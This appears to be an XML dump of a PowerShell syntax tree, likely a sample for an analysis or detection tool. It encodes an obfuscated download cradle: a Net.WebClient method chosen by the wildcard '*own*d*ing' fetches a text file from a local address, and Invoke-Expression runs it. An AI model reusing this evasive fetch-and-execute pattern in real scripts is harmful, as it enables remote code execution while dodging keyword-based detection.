<ScriptBlockAst>
  <UsingStatements />
  <NamedBlockAst>
    <Statements>
      <CommandAst>
            <CommandElements>
              <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Invoke-Expression</StringConstantExpressionAst>
              <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
                <Arguments>
                  <StringConstantExpressionAst StringConstantType="DoubleQuoted" StaticType="string">http://127.0.0.1:8899/qiye.txt</StringConstantExpressionAst>
                </Arguments>
                <MemberExpressionAst Static="False" StaticType="System.Object">
                  <ParenExpressionAst StaticType="System.Object">
                    <CommandAst>
                          <CommandElements>
                            <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">New-Object</StringConstantExpressionAst>
                            <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Net.WebClient</StringConstantExpressionAst>
                          </CommandElements>
                          </CommandAst>
                      </ParenExpressionAst>
                  <MemberExpressionAst Static="False" StaticType="System.Object">
                            <ParenExpressionAst StaticType="System.Object">
                              <PipelineAst>
                                <PipelineElements>
                                  <CommandExpressionAst>
                                    <MemberExpressionAst Static="False" StaticType="System.Object">
                                      <MemberExpressionAst Static="False" StaticType="System.Object">
                                        <ParenExpressionAst StaticType="System.Object">
                                          <CommandAst>
                                                <CommandElements>
                                                  <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">New-Object</StringConstantExpressionAst>
                                                  <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Net.WebClient</StringConstantExpressionAst>
                                                </CommandElements>
                                                </CommandAst>
                                            </ParenExpressionAst>
                                        <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">PsObject</StringConstantExpressionAst>
                                      </MemberExpressionAst>
                                      <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Methods</StringConstantExpressionAst>
                                    </MemberExpressionAst>
                                    </CommandExpressionAst>
                                  <CommandAst>
                                    <CommandElements>
                                      <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Where-Object</StringConstantExpressionAst>
                                      <ScriptBlockExpressionAst StaticType="scriptblock">
                                        <ScriptBlockAst>
                                          <UsingStatements />
                                          <NamedBlockAst>
                                            <Statements>
                                              <CommandExpressionAst>
                                                    <BinaryExpressionAst Operator="Ilike" StaticType="System.Object">
                                                      <MemberExpressionAst Static="False" StaticType="System.Object">
                                                        <VariableExpressionAst VariablePath="_" StaticType="System.Object" />
                                                        <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Name</StringConstantExpressionAst>
                                                      </MemberExpressionAst>
                                                      <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">*own*d*ing</StringConstantExpressionAst>
                                                    </BinaryExpressionAst>
                                                    </CommandExpressionAst>
                                                </Statements>
                                          </NamedBlockAst>
                                        </ScriptBlockAst>
                                      </ScriptBlockExpressionAst>
                                    </CommandElements>
                                    </CommandAst>
                                </PipelineElements>
                              </PipelineAst>
                            </ParenExpressionAst>
                            <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Name</StringConstantExpressionAst>
                          </MemberExpressionAst>
                          </MemberExpressionAst>
                <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Invoke</StringConstantExpressionAst>
              </InvokeMemberExpressionAst>
            </CommandElements>
            </CommandAst>
        </Statements>
  </NamedBlockAst>
</ScriptBlockAst>